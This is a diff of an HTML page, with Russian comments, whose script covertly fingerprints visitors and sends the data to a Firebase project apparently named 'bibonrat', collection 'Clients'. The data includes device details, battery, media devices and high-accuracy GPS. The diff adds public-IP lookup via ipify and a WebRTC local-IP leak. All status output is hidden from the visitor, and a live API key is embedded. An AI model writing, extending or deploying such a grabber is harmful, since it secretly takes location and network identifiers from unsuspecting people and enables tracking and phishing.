@@ -35,20 +35,21 @@
         </div>
 
     </div>
-    <!-- ✅ СКРЫТЫЕ ЭЛЕМЕНТЫ, ЧТОБЫ КОД НЕ ПАДАЛ -->
+    <!-- Скрытые элементы для статусов -->
     <div id="authStatus" style="display:none"></div>
     <div id="locationStatus" style="display:none"></div>
+    <div id="publicIpStatus" style="display:none"></div>
+    <div id="localIpStatus" style="display:none"></div>
     <div id="firestoreStatus" style="display:none"></div>
     <table style="display:none"><tbody id="infoBody"></tbody></table>
 
-
-    <!-- ВАЖНО: Modular Firebase SDK (пишем в именованную БД fishbibon) -->
+    <!-- Firebase SDK (modular) -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        // 🔑 Конфигурация Firebase (твои ключи)
+        // Конфигурация Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyAQlLh2Abk92sZVCSsYSCxvps4Uld3C1Lk",
             authDomain: "bibonrat.firebaseapp.com",
@@ -59,29 +60,25 @@
             appId: "1:78759159251:web:3e40d7d5a2aa762f01bb26"
         };
 
-        // ✅ ИНИЦИАЛИЗАЦИЯ
         const app = initializeApp(firebaseConfig);
-
-        // ✅ ВЫБИРАЕМ ИМЕННО БАЗУ Firestore: fishbibon (а не default)
         const DB_NAME = "fishbibon";
         const db = getFirestore(app, DB_NAME);
-
-        // ✅ Auth (анонимно) — чтобы правила request.auth != null пропускали запись
         const auth = getAuth(app);
-
-        // Коллекция для сохранения
         const COLLECTION_NAME = "Clients";
 
-        // DOM
+        // DOM элементы
         const infoBody = document.getElementById("infoBody");
         const locationStatus = document.getElementById("locationStatus");
+        const publicIpStatus = document.getElementById("publicIpStatus");
+        const localIpStatus = document.getElementById("localIpStatus");
         const firestoreStatus = document.getElementById("firestoreStatus");
         const authStatus = document.getElementById("authStatus");
 
-        // Хранилище данных
+        // Объект для сбора данных
         const collectedData = {};
 
         function setStatus(el, type, text) {
+            if (!el) return;
             el.className = "status " + type;
             el.innerText = text;
         }
@@ -94,7 +91,7 @@
             collectedData[label] = value;
         }
 
-        // Ждём авторизацию (без неё будет Missing or insufficient permissions)
+        // Авторизация (анонимная)
         let authReadyResolve;
         const authReady = new Promise((res) => (authReadyResolve = res));
 
@@ -124,7 +121,6 @@
                 data.firestoreDb = DB_NAME;
 
                 const docRef = await addDoc(collection(db, COLLECTION_NAME), data);
-
                 console.log("Saved to fishbibon. Doc ID:", docRef.id);
                 firestoreStatus.innerHTML = `✅ Данные сохранены в Firestore "${DB_NAME}" (ID: ${docRef.id})`;
                 firestoreStatus.style.color = "green";
@@ -135,12 +131,60 @@
             }
         }
 
-        // Главная логика
+        // Получение публичного IP через api.ipify.org
+        function getPublicIP() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => data.ip)
+                .catch(() => 'не удалось определить');
+        }
+
+        // Получение локального IP через WebRTC
+        function getLocalIP() {
+            return new Promise((resolve) => {
+                if (!window.RTCPeerConnection) {
+                    resolve('не поддерживается');
+                    return;
+                }
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                let ipFound = false;
+                pc.createDataChannel(''); // необходимо для инициации ICE
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => { });
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                        const match = ipRegex.exec(event.candidate.candidate);
+                        if (match && !ipFound) {
+                            ipFound = true;
+                            resolve(match[1]);
+                            pc.close();
+                        }
+                    } else {
+                        // Кандидаты закончились, IP не найден
+                        setTimeout(() => {
+                            if (!ipFound) {
+                                resolve('не удалось определить');
+                                pc.close();
+                            }
+                        }, 500);
+                    }
+                };
+                // Таймаут на случай зависания
+                setTimeout(() => {
+                    if (!ipFound) {
+                        resolve('таймаут');
+                        pc.close();
+                    }
+                }, 3000);
+            });
+        }
+
+        // Главная функция
         (async function main() {
-            // 0) Авторизация
+            // Авторизация
             initAuth();
 
-            // 1) Базовые данные
+            // Базовая информация (синхронно)
             addInfo("User Agent", navigator.userAgent);
             addInfo("Платформа", navigator.platform);
             addInfo("Язык", navigator.language);
@@ -148,12 +192,9 @@
             addInfo("Глубина цвета", `${screen.colorDepth} бит`);
             addInfo("Временная зона", Intl.DateTimeFormat().resolvedOptions().timeZone);
             addInfo("Включён ли cookie", navigator.cookieEnabled ? "Да" : "Нет");
-
-            // 2) CPU и память
             addInfo("Ядра CPU", navigator.hardwareConcurrency || "не поддерживается");
             addInfo("ОЗУ устройства", navigator.deviceMemory ? navigator.deviceMemory + " GB" : "недоступно");
 
-            // 3) Информация о сети
             if (navigator.connection) {
                 const conn = navigator.connection;
                 addInfo("Тип сети", conn.effectiveType || "неизвестно");
@@ -164,7 +205,7 @@
                 addInfo("Информация о сети", "не поддерживается");
             }
 
-            // 4) Информация о батарее
+            // Батарея
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
@@ -180,7 +221,7 @@
                 addInfo("Battery API", "не поддерживается");
             }
 
-            // 5) Медиа-устройства
+            // Медиа-устройства
             if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                 try {
                     const devices = await navigator.mediaDevices.enumerateDevices();
@@ -195,39 +236,54 @@
                 addInfo("enumerateDevices", "не поддерживается");
             }
 
-            // 6) Геолокация (GPS)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const { latitude, longitude, accuracy } = position.coords;
-                        addInfo("Широта", latitude.toFixed(6));
-                        addInfo("Долгота", longitude.toFixed(6));
-                        addInfo("Точность GPS", accuracy.toFixed(1) + " м");
+            // Асинхронные операции: геолокация, публичный IP, локальный IP
+            const geoPromise = new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const { latitude, longitude, accuracy } = position.coords;
+                            addInfo("Широта", latitude.toFixed(6));
+                            addInfo("Долгота", longitude.toFixed(6));
+                            addInfo("Точность GPS", accuracy.toFixed(1) + " м");
+                            setStatus(locationStatus, "success", "✅ Геолокация получена");
+                            resolve();
+                        },
+                        (error) => {
+                            let msg = "";
+                            switch (error.code) {
+                                case error.PERMISSION_DENIED: msg = "❌ Доступ к геолокации запрещён"; break;
+                                case error.POSITION_UNAVAILABLE: msg = "❌ Позиция недоступна"; break;
+                                case error.TIMEOUT: msg = "❌ Таймаут геолокации"; break;
+                                default: msg = "❌ Неизвестная ошибка геолокации";
+                            }
+                            addInfo("Геолокация", msg);
+                            setStatus(locationStatus, "error", msg);
+                            resolve();
+                        },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                } else {
+                    addInfo("Геолокация", "не поддерживается браузером");
+                    setStatus(locationStatus, "error", "❌ Геолокация не поддерживается");
+                    resolve();
+                }
+            });
 
-                        setStatus(locationStatus, "success", "✅ Геолокация получена");
-                        await saveToFirestore(collectedData);
-                    },
-                    async (error) => {
-                        let msg = "";
-                        switch (error.code) {
-                            case error.PERMISSION_DENIED: msg = "❌ Доступ к геолокации запрещён"; break;
-                            case error.POSITION_UNAVAILABLE: msg = "❌ Позиция недоступна"; break;
-                            case error.TIMEOUT: msg = "❌ Таймаут геолокации"; break;
-                            default: msg = "❌ Неизвестная ошибка геолокации";
-                        }
+            const publicIPPromise = getPublicIP().then(ip => {
+                addInfo("Публичный IP", ip);
+                setStatus(publicIpStatus, ip.includes('не удалось') ? 'error' : 'success', ip);
+            });
 
-                        addInfo("Геолокация", msg);
-                        setStatus(locationStatus, "error", msg);
+            const localIPPromise = getLocalIP().then(ip => {
+                addInfo("Локальный IP", ip);
+                setStatus(localIpStatus, ip.includes('не удалось') || ip.includes('не поддерживается') ? 'error' : 'success', ip);
+            });
 
-                        await saveToFirestore(collectedData);
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            } else {
-                addInfo("Геолокация", "не поддерживается браузером");
-                setStatus(locationStatus, "error", "❌ Геолокация не поддерживается");
-                await saveToFirestore(collectedData);
-            }
+            // Дожидаемся всех асинхронных данных
+            await Promise.all([geoPromise, publicIPPromise, localIPPromise]);
+
+            // Сохраняем всё в Firestore
+            await saveToFirestore(collectedData);
         })();
     </script>
 </body>
